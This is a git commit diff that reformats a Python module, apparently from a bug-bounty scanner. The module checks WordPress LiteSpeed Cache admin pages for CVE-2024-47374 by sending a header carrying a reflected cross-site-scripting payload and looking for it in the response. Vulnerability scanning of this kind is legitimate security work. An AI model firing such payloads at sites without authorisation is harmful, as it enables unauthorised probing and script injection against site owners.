b0ea93b916f2cc6ea3aaeb7c6d27c5d7cbb93cc7
Kharaone.BB <bugbounty@khara.one>
2025-09-20 15:11:11 +0200

    lint(CVE202447374): improve code readability and consistency in page and header definitions

--- modules/cp_cve/CVE202447374.py
+++ modules/cp_cve/CVE202447374.py
@@ -11,29 +11,31 @@ logger = configure_logger(__name__)
 
 
 PAGES = [
-    'wp-admin/admin.php?page=lscache-ccss',
-    'wp-admin/admin.php?page=lscache',
-    'wp-admin/admin.php?page=lscache-purge',
-    'wp-admin/admin.php?page=lscache-settings',
-    'wp-admin/admin.php?page=lscache-advanced'
+    "wp-admin/admin.php?page=lscache-ccss",
+    "wp-admin/admin.php?page=lscache",
+    "wp-admin/admin.php?page=lscache-purge",
+    "wp-admin/admin.php?page=lscache-settings",
+    "wp-admin/admin.php?page=lscache-advanced",
 ]
 
+
 def litespeed(base_url: str) -> None:
-    headers = {
-        'X-LSCACHE-VARY-VALUE': '"><script>alert("CVE-2024-47374")</script>'
-    }
+    headers = {"X-LSCACHE-VARY-VALUE": '"><script>alert("CVE-2024-47374")</script>'}
 
     for page in PAGES:
         target_url = f"{base_url}{page}"
         try:
-            response = requests.get(target_url, headers=headers, verify=False, timeout=10)
-            if 'CVE-2024-47374' in response.text:
-                print(f" {Identify.confirmed} | CVE-2024-47374| {Colors.BLUE}{target_url}{Colors.RESET} | PAYLOAD: {headers}")
+            response = requests.get(
+                target_url, headers=headers, verify=False, timeout=10
+            )
+            if "CVE-2024-47374" in response.text:
+                print(
+                    f" {Identify.confirmed} | CVE-2024-47374| {Colors.BLUE}{target_url}{Colors.RESET} | PAYLOAD: {headers}"
+                )
         except requests.Timeout as t:
-            logger.exception(f"request timeout {base_url}", t)
+            logger.error(f"request timeout {base_url}", t)
         except KeyboardInterrupt:
             print("Exiting")
             sys.exit()
         except Exception as e:
             logger.exception(f"request error {base_url}", e)
-
